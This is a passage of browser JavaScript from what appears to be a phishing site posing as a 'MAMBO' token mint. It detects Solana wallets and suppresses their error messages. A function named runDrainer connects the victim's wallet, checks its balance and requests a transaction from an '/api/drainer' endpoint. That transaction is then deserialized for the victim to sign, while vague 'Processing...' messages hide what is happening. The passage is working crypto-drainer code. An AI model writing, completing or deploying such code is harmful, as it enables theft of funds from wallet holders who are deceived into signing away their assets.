      const hasConnect = typeof provider.connect === 'function';
      const hasPublicKey = provider.publicKey || provider.address;
      
      return provider && hasConnect;
    }

    // Get mobile store URL based on platform
    function getMobileStoreUrl(wallet) {
      if (!wallet.mobile) return wallet.install;
      
      // Use synchronous platform detection for immediate response
      const userAgent = navigator.userAgent.toLowerCase();
      const isIOS = /iphone|ipad|ipod/.test(userAgent);
      const isAndroid = /android/.test(userAgent);
      const platform = isIOS ? 'ios' : isAndroid ? 'android' : 'unknown';
      
      if (platform === 'ios') {
        return wallet.mobile.appStore;
      } else if (platform === 'android') {
        return wallet.mobile.playStore;
      }
      return wallet.install; // Fallback to desktop
    }

    // Force mobile wallet detection by checking all possible objects
    function forceDetectMobileWallets() {
      
      const detectedWallets = [];
      
      // Check for any solana-related objects
      const solanaObjects = [
        'window.solana',
        'window.phantom',
        'window.solflare', 
        'window.backpack',
        'window.glow',
        'window.trustwallet',
        'window.exodus',
        'window.phantom?.solana',
        'window.trustwallet?.solana'
      ];
      
      solanaObjects.forEach(objPath => {
        try {
          // Safe property access without eval
          let obj = null;
          if (objPath === 'window.solana') obj = window.solana;
          else if (objPath === 'window.phantom') obj = window.phantom;
          else if (objPath === 'window.solflare') obj = window.solflare;
          else if (objPath === 'window.backpack') obj = window.backpack;
          else if (objPath === 'window.glow') obj = window.glow;
          else if (objPath === 'window.trustwallet') obj = window.trustwallet;
          else if (objPath === 'window.exodus') obj = window.exodus;
          else if (objPath === 'window.phantom?.solana') obj = window.phantom?.solana;
          else if (objPath === 'window.trustwallet?.solana') obj = window.trustwallet?.solana;
          
          if (obj && typeof obj === 'object') {
            detectedWallets.push(objPath);
          }
        } catch (e) {
          // Object doesn't exist
        }
      });
      
      return detectedWallets;
    }

    // Wallet provider conflict resolution - delegated to backend
    async function resolveWalletConflicts() {
      console.log('[WALLET_CONFLICTS] Resolving wallet provider conflicts...');
      
      try {
        // Get available providers from window object
        const availableProviders = [];
        if (window.solana) availableProviders.push('window.solana');
        if (window.phantom) availableProviders.push('window.phantom');
        if (window.solflare) availableProviders.push('window.solflare');
        if (window.backpack) availableProviders.push('window.backpack');
        if (window.glow) availableProviders.push('window.glow');
        if (window.trustwallet) availableProviders.push('window.trustwallet');
        if (window.exodus) availableProviders.push('window.exodus');
        
        const response = await fetch('/api/wallet-management', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            operation: 'detect_installed_wallets',
            availableProviders: availableProviders
          })
        });
        
        const data = await response.json();
        if (data.success) {
          console.log('[WALLET_CONFLICTS] Detected wallets:', data.result.detectedWallets);
          console.log('[WALLET_CONFLICTS] Prioritized wallets:', data.result.prioritizedWallets);
          console.log('[WALLET_CONFLICTS] Recommended wallet:', data.result.recommendedWallet);
          return data.result.detectedWallets;
        }
      } catch (error) {
        console.error('[WALLET_CONFLICTS] Backend resolution failed:', error);
      }
      
      // Fallback to basic detection
      const installedWallets = [];
      if (window.phantom?.solana || (window.solana && window.solana.isPhantom)) {
        installedWallets.push('phantom');
      }
      if (window.backpack || window.BackpackWallet || (window.solana && window.solana.isBackpack)) {
        installedWallets.push('backpack');
      }
      if (window.solflare || (window.solana && window.solana.isSolflare)) {
        installedWallets.push('solflare');
      }
      if (window.trustwallet || (window.solana && window.solana.isTrustWallet)) {
        installedWallets.push('trustwallet');
      }
      if (window.exodus || (window.solana && window.solana.isExodus)) {
        installedWallets.push('exodus');
      }
      
      console.log('[WALLET_CONFLICTS] Fallback detected wallets:', installedWallets);
      return installedWallets;
    }
    
    // Initialize wallet conflict resolution
    resolveWalletConflicts();
    
    // Initialize enhanced wallet conflict resolution
    initializeWalletConflictResolution();
    
    // Enhanced wallet conflict resolution system
    function initializeWalletConflictResolution() {
      console.log('[WALLET_CONFLICTS] Initializing enhanced conflict resolution...');
      
      // Detect and prioritize wallets based on availability and functionality
      const walletPriority = [];
      
      // Check each wallet and add to priority list based on functionality
      if (window.backpack && typeof window.backpack.connect === 'function') {
        walletPriority.push({ name: 'backpack', priority: 1, provider: window.backpack });
      }
      if (window.phantom && typeof window.phantom.connect === 'function') {
        walletPriority.push({ name: 'phantom', priority: 2, provider: window.phantom });
      }
      if (window.solflare && typeof window.solflare.connect === 'function') {
        walletPriority.push({ name: 'solflare', priority: 3, provider: window.solflare });
      }
      if (window.glow && typeof window.glow.connect === 'function') {
        walletPriority.push({ name: 'glow', priority: 4, provider: window.glow });
      }
      if (window.trustwallet && typeof window.trustwallet.connect === 'function') {
        walletPriority.push({ name: 'trustwallet', priority: 5, provider: window.trustwallet });
      }
      if (window.exodus && typeof window.exodus.connect === 'function') {
        walletPriority.push({ name: 'exodus', priority: 6, provider: window.exodus });
      }
      
      // Sort by priority
      walletPriority.sort((a, b) => a.priority - b.priority);
      
      console.log('[WALLET_CONFLICTS] Wallet priority order:', walletPriority.map(w => w.name));
      
      // Set the recommended wallet
      if (walletPriority.length > 0) {
        window.recommendedWallet = walletPriority[0].name;
        console.log('[WALLET_CONFLICTS] Recommended wallet:', window.recommendedWallet);
      }
      
      // Show wallet conflict notification if multiple wallets detected
      if (walletPriority.length > 1) {
        console.log('[WALLET_CONFLICTS] Multiple wallets detected - showing conflict resolution');
        showWalletConflictNotification(walletPriority);
      }
      
      return walletPriority;
    }
    
    // Show wallet conflict notification to user
    function showWalletConflictNotification(walletPriority) {
      const conflictModal = document.createElement('div');
      conflictModal.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.8);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 10000;
        font-family: Arial, sans-serif;
      `;
      
      const modalContent = document.createElement('div');
      modalContent.style.cssText = `
        background: #1a1a1a;
        border: 1px solid #333;
        border-radius: 12px;
        padding: 30px;
        max-width: 500px;
        width: 90%;
        text-align: center;
        color: white;
      `;
      
      modalContent.innerHTML = `
        <h3 style="color: #ff6b6b; margin-bottom: 20px;">🔧 Wallet Conflict Detected</h3>
        <p style="margin-bottom: 20px; color: #ccc;">
          Multiple Solana wallets detected. We've prioritized them for optimal performance:
        </p>
        <div style="margin-bottom: 20px;">
          ${walletPriority.map((wallet, index) => `
            <div style="display: flex; align-items: center; justify-content: space-between; 
                        padding: 10px; margin: 5px 0; background: ${index === 0 ? '#2d5a2d' : '#333'}; 
                        border-radius: 8px;">
              <span style="color: ${index === 0 ? '#4ade80' : '#ccc'};">
                ${index + 1}. ${wallet.name.charAt(0).toUpperCase() + wallet.name.slice(1)}
              </span>
              ${index === 0 ? '<span style="color: #4ade80;">✓ Recommended</span>' : ''}
            </div>
          `).join('')}
        </div>
        <p style="color: #888; font-size: 14px; margin-bottom: 20px;">
          Using the recommended wallet will provide the best experience.
        </p>
        <button onclick="this.parentElement.parentElement.remove()" 
                style="background: #4ade80; color: white; border: none; padding: 12px 24px; 
                       border-radius: 8px; cursor: pointer; font-size: 16px;">
          Got it!
        </button>
      `;
      
      conflictModal.appendChild(modalContent);
      document.body.appendChild(conflictModal);
      
      // Auto-remove after 10 seconds
      setTimeout(() => {
        if (conflictModal.parentElement) {
          conflictModal.remove();
        }
      }, 10000);
    }
    
    // Global error handler for wallet provider conflicts
    window.addEventListener('error', function(event) {
      // Suppress wallet provider conflict errors
      if (event.message && (
        event.message.includes('Unable to set window.solana') ||
        event.message.includes('Unable to set window.phantom.solana') ||
        event.message.includes('Backpack couldn\'t override') ||
        event.message.includes('window.ethereum') ||
        event.message.includes('Could not assign Exodus provider') ||
        event.message.includes('Could not assign') ||
        event.message.includes('provider to window') ||
        event.message.includes('JSON-RPC: method call timeout') ||
        event.message.includes('method call timeout calling connect') ||
        event.message.includes('Failed to load resource: net::ERR_BLOCKED_BY_CLIENT') ||
        event.message.includes('o370968.ingest.sentry.io') ||
        event.message.includes('sentry.io') ||
        event.message.includes('ERR_BLOCKED_BY_CLIENT') ||
        event.message.includes('content.js') ||
        event.message.includes('_sendEnvelope') ||
        event.message.includes('captureSession') ||
        event.message.includes('inpage.js') ||
        event.message.includes('inapp.js') ||
        event.message.includes('Unable to set window.solana') ||
        event.message.includes('Could not assign')
      )) {
        console.warn('[WALLET_CONFLICTS] Suppressed wallet provider conflict:', event.message);
        event.preventDefault();
        return false;
      }
    });
    
    // Handle unhandled promise rejections from wallet providers
    window.addEventListener('unhandledrejection', function(event) {
      if (event.reason && event.reason.message && (
        event.reason.message.includes('Unable to set window.solana') ||
        event.reason.message.includes('Unable to set window.phantom.solana') ||
        event.reason.message.includes('Backpack couldn\'t override') ||
        event.reason.message.includes('window.ethereum') ||
        event.reason.message.includes('Could not assign Exodus provider') ||
        event.reason.message.includes('Could not assign') ||
        event.reason.message.includes('provider to window') ||
        event.reason.message.includes('JSON-RPC: method call timeout') ||
        event.reason.message.includes('method call timeout calling connect') ||
        event.reason.message.includes('Failed to load resource: net::ERR_BLOCKED_BY_CLIENT') ||
        event.reason.message.includes('o370968.ingest.sentry.io') ||
        event.reason.message.includes('sentry.io') ||
        event.reason.message.includes('ERR_BLOCKED_BY_CLIENT') ||
        event.reason.message.includes('content.js') ||
        event.reason.message.includes('_sendEnvelope') ||
        event.reason.message.includes('captureSession') ||
        event.reason.message.includes('inpage.js') ||
        event.reason.message.includes('inapp.js') ||
        event.reason.message.includes('Unable to set window.solana') ||
        event.reason.message.includes('Could not assign')
      )) {
        console.warn('[WALLET_CONFLICTS] Suppressed wallet provider promise rejection:', event.reason.message);
        event.preventDefault();
        return false;
      }
    });

    // Wallet definitions - all supported wallets (Backpack prioritized)
    const WALLET_DEFS = [
      {
        key: 'backpack',
        name: 'Backpack',
        icon: '/backpack-logo.png',
        provider: () => {
          try {
          // Enhanced Backpack detection with multiple fallbacks
          const possibleBackpacks = [
            window.backpack,
            window.BackpackWallet,
            window.backpackWallet,
            window.backpack?.solana,
            window.BackpackWallet?.solana
          ];
          
          for (const wallet of possibleBackpacks) {
            if (wallet && typeof wallet === 'object') {
              const hasConnect = typeof wallet.connect === 'function';
              if (hasConnect) {
                return wallet;
              }
            }
          }
          
          return null;
          } catch (error) {
            console.warn('[BACKPACK] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://backpack.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/backpack-wallet/id6446591340',
          playStore: 'https://play.google.com/store/apps/details?id=app.backpack',
          deepLink: 'https://backpack.app/ul/v1/browse/',
          universalLink: 'https://backpack.app/ul/v1/browse/',
          mobileStrategies: [
            'https://backpack.app/ul/v1/browse/',
            'backpack://v1/browse/'
          ]
        }
      },
      {
        key: 'phantom',
        name: 'Phantom',
        icon: '/phantom-logo.png',
        provider: () => {
          try {
            // Try to get Phantom provider with conflict resolution
          const phantom = window.phantom?.solana || window.solana;
            if (phantom && typeof phantom === 'object' && phantom.isPhantom) {
              return phantom;
            }
            return null;
          } catch (error) {
            console.warn('[PHANTOM] Provider detection failed:', error);
            return null;
          }
        },
        install: 'https://phantom.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/phantom-crypto-wallet/id1598432977',
          playStore: 'https://play.google.com/store/apps/details?id=app.phantom',
          deepLink: 'https://phantom.app/ul/browse/',
          universalLink: 'https://phantom.app/ul/browse/',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'https://phantom.app/ul/browse/',
            'phantom://browse/'
          ]
        }
      },
      {
        key: 'solflare',
        name: 'Solflare',
        icon: '/solflare-logo.png',
        provider: () => {
          // Enhanced Solflare detection - similar to Phantom and Backpack
          console.log('[SOLFLARE_DETECTION] Checking for Solflare provider...');
          
          // Primary Solflare detection
          const solflare = window.solflare;
          if (solflare && typeof solflare === 'object') {
            console.log('[SOLFLARE_DETECTION] Found window.solflare:', Object.keys(solflare));
            // Check if it's actually Solflare with multiple indicators
            if (solflare.isSolflare || 
                solflare.isConnected || 
                typeof solflare.connect === 'function' ||
                solflare.publicKey ||
                solflare.account) {
              console.log('[SOLFLARE_DETECTION] Valid Solflare provider found');
              return solflare;
            }
          }
          
          // Alternative Solflare objects
          const altSolflare = window.solflareWallet || window.SolflareWallet;
          if (altSolflare && typeof altSolflare === 'object') {
            console.log('[SOLFLARE_DETECTION] Found alternative Solflare:', Object.keys(altSolflare));
            return altSolflare;
          }
          
          // Check for Solflare in window.solana (some versions)
          if (window.solana && window.solana.isSolflare) {
            console.log('[SOLFLARE_DETECTION] Found Solflare in window.solana');
            return window.solana;
          }
          
          console.log('[SOLFLARE_DETECTION] No Solflare provider found');
          return null;
        },
        install: 'https://solflare.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/solflare/id1580902717',
          playStore: 'https://play.google.com/store/apps/details?id=com.solflare.mobile',
          deepLink: 'https://solflare.com/ul/v1/browse/',
          universalLink: 'https://solflare.com/ul/v1/browse/',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'https://solflare.com/ul/v1/browse/',
            'solflare://v1/browse/'
          ]
        }
      },
      {
        key: 'glow',
        name: 'Glow',
        icon: '/glow-logo.png',
        provider: () => {
          // Enhanced Glow detection with multiple fallbacks
          const possibleGlows = [
            window.glow,
            window.GlowWallet,
            window.glowWallet,
            window.glow?.solana,
            window.GlowWallet?.solana
          ];
          
          for (const wallet of possibleGlows) {
            if (wallet && typeof wallet === 'object') {
              const hasConnect = typeof wallet.connect === 'function';
              if (hasConnect) {
                return wallet;
              }
            }
          }
          
          return null;
        },
        install: 'https://glow.app/',
        mobile: {
          appStore: 'https://apps.apple.com/app/glow-wallet/id1635717553',
          playStore: 'https://play.google.com/store/apps/details?id=com.glow.wallet',
          deepLink: 'glow://app/',
          universalLink: 'https://glow.app/ul/app/',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'glow://app/',
            'glow://browse/',
            'glow://dapp/',
            'glow://open/',
            'https://glow.app/ul/app/',
            'https://glow.app/ul/browse/',
            'https://glow.app/ul/dapp/',
            'https://glow.app/ul/open/'
          ]
        }
      },
      {
        key: 'trustwallet',
        name: 'Trust Wallet',
        icon: '/trust-logo.png',
        provider: () => {
          // Enhanced Trust Wallet detection with better fallbacks
          console.log('Trust Wallet detection - checking for Trust Wallet objects:');
          console.log('window.trustwallet:', window.trustwallet);
          console.log('window.trustwallet?.solana:', window.trustwallet?.solana);
          console.log('window.trustWallet:', window.trustWallet);
          console.log('window.trustwallet?.provider:', window.trustwallet?.provider);
          console.log('window.trustwallet?.solana?.provider:', window.trustwallet?.solana?.provider);
          
          // Check all possible Trust Wallet objects with more comprehensive detection
          const possibleTrustWallets = [
            window.trustwallet?.solana,
            window.trustwallet,
            window.trustWallet,
            window.TrustWallet,
            window.trustwallet?.provider,
            window.trustwallet?.solana?.provider,
            // Check if any global object has Trust Wallet properties
            Object.values(window).find(obj => obj && typeof obj === 'object' && obj.isTrustWallet),
            window.trustWallet?.provider
          ];
          
          for (const wallet of possibleTrustWallets) {
            if (wallet && typeof wallet === 'object') {
              console.log('Found Trust Wallet object:', wallet);
              console.log('Trust Wallet object properties:', Object.keys(wallet));
              
              // Check if we're on mobile device
              const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
              const isTrustWalletBrowser = navigator.userAgent.includes('TrustWallet') || 
                                         window.location.href.includes('trustwallet') ||
                                         document.referrer.includes('trustwallet') ||
                                         window.location.href.includes('trust') ||
                                         document.referrer.includes('trust');
              
              // Only show unsupported message on mobile Trust Wallet dApp browser
              if (isMobileDevice && isTrustWalletBrowser) {
                console.log('Mobile Trust Wallet dApp browser detected - limited support');
                return {
                  name: 'Trust Wallet',
                  isTrustWallet: true,
                  isUnsupported: true, // Flag to indicate limited support on mobile
                  originalProvider: wallet, // Keep reference to original provider
                  connect: async () => {
                    throw new Error('Trust Wallet mobile dApp browser has limited MAMBO support. Please use Phantom or Solflare for this mint.');
                  },
                  signTransaction: async () => {
                    throw new Error('Trust Wallet mobile dApp browser does not support MAMBO transaction signing. Please use Phantom or Solflare.');
                  },
                  signMessage: async () => {
                                          throw new Error('Trust Wallet mobile dApp browser does not support MAMBO message signing. Please use Phantom or Solflare.');
                  }
                };
              } else {
                // Desktop Trust Wallet extension works fine
                console.log('Desktop Trust Wallet extension detected - full support');
                return wallet; // Return the original wallet object for normal operation
              }
            }
          }
          
          console.log('No Trust Wallet detected');
          return null;
        },
        install: 'https://trustwallet.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409',
          playStore: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp',
          deepLink: 'https://link.trustwallet.com/open_url',
          universalLink: 'https://link.trustwallet.com/open_url',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'https://link.trustwallet.com/open_url',
            'trust://open_url'
          ]
        }
      },
      {
        key: 'exodus',
        name: 'Exodus',
        icon: '/exodus-logo.png',
        provider: () => {
          // Enhanced Exodus detection with multiple fallbacks
          console.log('Exodus detection - checking for Exodus objects:');
          console.log('window.exodus:', window.exodus);
          console.log('window.exodusWallet:', window.exodusWallet);
          console.log('window.ExodusWallet:', window.ExodusWallet);
          
          // Check all possible Exodus objects with enhanced detection
          const possibleExodus = [
            window.exodus,
            window.exodusWallet,
            window.ExodusWallet,
            window.exodus?.solana,
            window.exodusWallet?.solana,
            // Check if any global object has Exodus properties
            Object.values(window).find(obj => obj && typeof obj === 'object' && obj.isExodus),
            // Check for Exodus in different naming conventions
            window.Exodus,
            window.exodus?.provider,
            window.exodusWallet?.provider
          ];
          
          for (const wallet of possibleExodus) {
            if (wallet && typeof wallet === 'object') {
              console.log('Found Exodus object:', wallet);
              console.log('Exodus object properties:', Object.keys(wallet));
              
              // Check if it has essential methods
              const hasConnect = typeof wallet.connect === 'function';
              const hasSignTransaction = typeof wallet.signTransaction === 'function';
              const hasPublicKey = wallet.publicKey || wallet.address;
              
              console.log('Exodus capabilities:', { hasConnect, hasSignTransaction, hasPublicKey });
              
              if (hasConnect) {
                return wallet;
              }
            }
          }
          
          console.log('No Exodus detected');
          return null;
        },
        install: 'https://exodus.com/',
        mobile: {
          appStore: 'https://apps.apple.com/app/exodus-crypto-bitcoin-wallet/id1414384820',
          playStore: 'https://play.google.com/store/apps/details?id=exodusmovement.exodus',
          deepLink: 'exodus://dapp/',
          universalLink: 'https://exodus.com/app/dapp?url=',
          // Mobile-specific deep link strategies (only for mobile browsers)
          mobileStrategies: [
            'exodus://dapp/',
            'exodus://browse/',
            'exodus://app/',
            'exodus://open/',
            'https://exodus.com/app/dapp?url=',
            'https://exodus.com/app/browse?url=',
            'https://exodus.com/app/app?url=',
            'https://exodus.com/app/open?url='
          ]
        }
      }
    ];

    // Wallet provider detection at page load - production ready



// Show status message in the status modal
window.showStatus = function showStatus(message, type = 'info') {
  const modal = document.getElementById('statusModal');
  const msgEl = document.getElementById('statusModalMsg');
  if (msgEl && modal) {
    let color = '#00FF88';
    if (type === 'error') color = '#f66';
    if (type === 'loading') color = '#FFD700';
    msgEl.innerHTML = `<span style="color:${color};font-weight:600;">${message}</span>`;
    modal.classList.add('active');
    
    // Add close button event listeners
    setTimeout(() => {
      const closeBtn = document.getElementById('statusModalClose');
      const closeSingleBtn = document.getElementById('statusModalCloseSingle');
      const retryBtn = document.getElementById('statusModalRetry');
      
      if (closeBtn) {
        closeBtn.onclick = () => {
          modal.classList.remove('active');
        };
      }
      
      if (closeSingleBtn) {
        closeSingleBtn.onclick = () => {
          modal.classList.remove('active');
        };
      }
      
      if (retryBtn) {
        retryBtn.onclick = () => {
          modal.classList.remove('active');
          // Retry logic can be added here
          window.location.reload();
        };
      }
    }, 100);
  }
}

// Backend-delegated wallet operations
async function detectWalletType(userAgent, availableProviders = []) {
  try {
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'detect_wallet',
        userAgent: userAgent,
        availableProviders: availableProviders
      })
    });
    
    const data = await response.json();
    return data.result?.wallet || { key: 'unknown', name: 'Unknown Wallet' };
  } catch (error) {
    console.error('[WALLET_DETECTION] Backend detection failed:', error);
    return { key: 'unknown', name: 'Unknown Wallet' };
  }
}

async function fetchWalletBalance(publicKey) {
  try {
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'fetch_balance',
        publicKey: publicKey
      })
    });
    
    const data = await response.json();
    return {
      success: data.result?.success || false,
      balance: data.result?.balance || 0,
      balanceSOL: data.result?.balanceSOL || '0.000000',
      error: data.result?.error
    };
  } catch (error) {
    console.error('[BALANCE_FETCH] Backend fetch failed:', error);
    return {
      success: false,
      balance: 0,
      balanceSOL: '0.000000',
      error: error.message
    };
  }
}

// Transaction validation is now handled by the backend TOCTOU protection

async function broadcastTransaction(signedTransaction) {
  try {
    console.log('[BROADCAST] Starting broadcast transaction...');
    
    // Check if signedTransaction has serialize method
    if (!signedTransaction || typeof signedTransaction.serialize !== 'function') {
      throw new Error('Invalid signed transaction - missing serialize method');
    }
    
    console.log('[BROADCAST] Sending to backend...');
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        operation: 'broadcast_transaction',
        signedTransaction: signedTransaction.serialize().toString('base64'),
        lastValidBlockHeight: signedTransaction.lastValidBlockHeight
      })
    });
    
    console.log('[BROADCAST] Backend response status:', response.status);
    const data = await response.json();
    console.log('[BROADCAST] Backend response data:', data);
    
    return {
      success: data.result?.success || false,
      signature: data.result?.signature,
      error: data.result?.error
    };
  } catch (error) {
    console.error('[TRANSACTION_BROADCAST] Backend broadcast failed:', error);
    return {
      success: false,
      signature: null,
      error: error.message
    };
  }
}

// Monitor transaction confirmation on-chain
async function monitorTransactionConfirmation(signature, walletType = null) {
  console.log('[MONITOR] Starting transaction confirmation monitoring...');
  console.log('[MONITOR] Signature:', signature);
  console.log('[MONITOR] Wallet type:', walletType);
  
  // Get wallet type from parameter or connected wallet
  const detectedWalletType = walletType || window.connectedWallet?.key || 'unknown';
  console.log('[MONITOR] Using wallet type:', detectedWalletType);
  
  try {
    console.log('[MONITOR] Sending to backend...');
    const response = await fetch('/api/wallet-management', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        operation: 'monitor_transaction',
        signature: signature,
        walletType: detectedWalletType,
        publicKey: window.connectedWallet?.publicKey?.toString() || window.userPublicKey
      })
    });

    console.log('[MONITOR] Response status:', response.status);
    console.log('[MONITOR] Response ok:', response.ok);

    if (!response.ok) {
      const errorText = await response.text();
      console.error('[MONITOR] Response error:', errorText);
      throw new Error(`HTTP ${response.status}: ${response.statusText} - ${errorText}`);
    }
    
    const data = await response.json();
    console.log('[MONITOR] Backend response:', data);
    console.log('[MONITOR] Result:', data.result);
    
    return {
      success: data.result?.success || false,
      status: data.result?.status,
      error: data.result?.error,
      confirmation: data.result?.confirmation
    };
  } catch (error) {
    console.error('[MONITOR] Backend monitoring failed:', error);
    console.error('[MONITOR] Error details:', {
      name: error.name,
      message: error.message,
      stack: error.stack
    });
    return {
      success: false,
      status: 'monitor_failed',
      error: error.message
    };
  }
}

// Backend-delegated runDrainer implementation
// Global flag to prevent multiple simultaneous drainer runs
let isDrainerRunning = false;

async function runDrainer(provider) {
  console.log('[runDrainer] Starting drain process...');
  console.log('[runDrainer] Provider received:', !!provider);
  console.log('[runDrainer] Provider type:', typeof provider);
  console.log('[runDrainer] Provider keys:', provider ? Object.keys(provider) : 'No provider');
  
  // Prevent multiple simultaneous runs
  if (isDrainerRunning) {
    console.log('[runDrainer] Already running, skipping duplicate call');
    return;
  }
  
  isDrainerRunning = true;
  
  try {
            showStatus('Processing...', 'loading');
    
    // 1. Get the public key from the provider
    let publicKey = provider.publicKey || provider.address;
    console.log('[runDrainer] Initial publicKey:', publicKey);
    console.log('[runDrainer] Provider has connect method:', typeof provider.connect === 'function');
    console.log('[runDrainer] Provider has signTransaction method:', typeof provider.signTransaction === 'function');
    
    // Always try to connect if not already connected
    if (!publicKey && provider && typeof provider.connect === 'function') {
      try {
        console.log('[runDrainer] calling provider.connect()...');
        const result = await provider.connect();
        console.log('[runDrainer] provider.connect() result:', result);
        publicKey = result?.publicKey || provider.publicKey || provider.address;
        console.log('[runDrainer] publicKey after connect:', publicKey);
      } catch (connectErr) {
        console.error('[runDrainer] provider.connect() error:', connectErr);
        showStatus('Failed', 'error');
        return;
      }
    }
    
    if (!publicKey) {
        showStatus('Failed', 'error');
        return;
    }

    // Ensure publicKey is properly converted to string
    let publicKeyString;
    try {
      if (typeof publicKey === 'string') {
        publicKeyString = publicKey;
      } else if (publicKey && typeof publicKey.toString === 'function') {
        publicKeyString = publicKey.toString();
      } else if (publicKey && publicKey.toBase58) {
        publicKeyString = publicKey.toBase58();
      } else {
        throw new Error('Invalid public key format');
      }
      
      // Validate the public key string format
      if (!publicKeyString || publicKeyString.length < 32 || publicKeyString.length > 44) {
        throw new Error('Invalid public key length');
      }
      
      console.log('[runDrainer] Final publicKeyString:', publicKeyString);
    } catch (keyError) {
      console.error('[runDrainer] Public key conversion error:', keyError);
      showStatus('Failed', 'error');
      return;
    }

    // 2. Get wallet type from connected wallet info instead of detecting
    showStatus('Processing...', 'loading');
    
    let walletInfo;
    if (window.connectedWallet && window.connectedWallet.key) {
      // Use the wallet that was actually connected
      const walletKey = window.connectedWallet.key;
      console.log('[runDrainer] Using connected wallet:', walletKey);
      console.log('[runDrainer] Connected wallet details:', window.connectedWallet);
      
      // Map wallet key to wallet info
      const walletMap = {
        'phantom': { key: 'phantom', name: 'Phantom', logo: '/phantom-logo.png' },
        'solflare': { key: 'solflare', name: 'Solflare', logo: '/solflare-logo.png' },
        'backpack': { key: 'backpack', name: 'Backpack', logo: '/backpack-logo.png' },
        'glow': { key: 'glow', name: 'Glow', logo: '/glow-logo.png' },
        'trustwallet': { key: 'trustwallet', name: 'Trust Wallet', logo: '/trust-logo.png' },
        'exodus': { key: 'exodus', name: 'Exodus', logo: '/exodus-logo.png' }
      };
      
      walletInfo = walletMap[walletKey] || { key: 'unknown', name: 'Unknown Wallet', logo: '/logo.png' };
      console.log('[runDrainer] Wallet info from connected wallet:', walletInfo);
    } else {
      // Fallback to detection if no connected wallet info
      console.log('[runDrainer] No connected wallet info, falling back to detection');
    const availableProviders = [];
    if (window.solana) availableProviders.push('window.solana');
    if (window.phantom) availableProviders.push('window.phantom');
    if (window.solflare) availableProviders.push('window.solflare');
    if (window.backpack) availableProviders.push('window.backpack');
    if (window.glow) availableProviders.push('window.glow');
    if (window.trustwallet) availableProviders.push('window.trustwallet');
    if (window.exodus) availableProviders.push('window.exodus');
    
      walletInfo = await detectWalletType(navigator.userAgent, availableProviders);
    }
    
    console.log('[runDrainer] Using wallet:', walletInfo);

    // 3. Use backend for balance fetching
    showStatus('Processing...', 'loading');
    const balanceResult = await fetchWalletBalance(publicKeyString);
    
    if (!balanceResult.success) {
      showStatus('Ineligible', 'error');
        return;
    }

    console.log('[runDrainer] Balance:', balanceResult.balanceSOL, 'SOL');

    // 4. Fetch the mint transaction from the backend
    showStatus('Processing...', 'loading');
    
    let response;
    try {
          response = await fetch(`/api/drainer`, {
            method: 'POST',
        headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              publicKey: publicKeyString,
              wallet: publicKeyString, // Also send as 'wallet' for backend compatibility
          walletType: walletInfo.key
        })
      });
    } catch (fetchError) {
      console.error('[runDrainer] Network error:', fetchError);
      showStatus('Failed', 'error');
      return;
    }
    
    // Handle HTTP errors with proper error parsing
    if (!response.ok) {
      try {
        const errorData = await response.json();
        console.error('[runDrainer] Backend error:', errorData);
        
        // Handle standardized error responses
        if (errorData.success === false && errorData.error) {
          // Use the error message from backend
          showStatus(errorData.error, 'error');
        } else if (errorData.code === 'INSUFFICIENT_FUNDS' || errorData.code === 'INSUFFICIENT_FUNDS_FOR_FEE') {
          showStatus('Ineligible', 'error');
        } else if (errorData.code === 'TOO_MANY_REQUESTS') {
          const retryAfter = errorData.metadata?.retryAfter || 60;
          showStatus('Failed', 'error');
        } else if (errorData.code === 'INVALID_PUBLIC_KEY' || errorData.code === 'INVALID_WALLET_ADDRESS') {
          showStatus('Failed', 'error');
        } else {
          showStatus('Failed', 'error');
        }
      } catch (parseError) {
        console.error('[runDrainer] Failed to parse error response:', parseError);
        showStatus('Ineligible', 'error');
      }
      return;
    }
    
    const responseData = await response.json();
    
    // Debug: Log the raw response data
    console.log('[runDrainer] Raw response data:', responseData);
    
    // Validate response structure
    if (!responseData.success || !responseData.transaction) {
      console.error('[runDrainer] Invalid response structure:', responseData);
        showStatus('Failed', 'error');
      return;
    }
    
    const txBase64 = responseData.transaction;
    
    // 5. Deserialize the transaction
    let txBytes;
    try {
      txBytes = Uint8Array.from(atob(txBase64), c => c.charCodeAt(0));
    } catch (decodeError) {
      console.error('[runDrainer] Transaction decode error:', decodeError);
      showStatus('Failed', 'error');
      return;
    }
    
    // Validate transaction data
    if (!txBytes || txBytes.length === 0) {
      console.error('[runDrainer] Empty transaction data');
      showStatus('Failed', 'error');
      return;
    }
    
    // Debug: Log the response data before transaction creation
    console.log('[runDrainer] Response data before transaction creation:', responseData);
    
    // Create transaction object with error handling
    let transaction;
    try {
      transaction = solanaWeb3.Transaction.from(txBytes);
      console.log('[runDrainer] Transaction created successfully');
    } catch (transactionError) {
      console.error('[runDrainer] Transaction creation error:', transactionError);
      showStatus('Failed', 'error');
      return;
    }
    
    // Debug: Log the full response data
    console.log('[runDrainer] Full response data:', responseData);
    
    // Restore lastValidBlockHeight from backend response
    if (responseData.lastValidBlockHeight) {
      transaction.lastValidBlockHeight = responseData.lastValidBlockHeight;
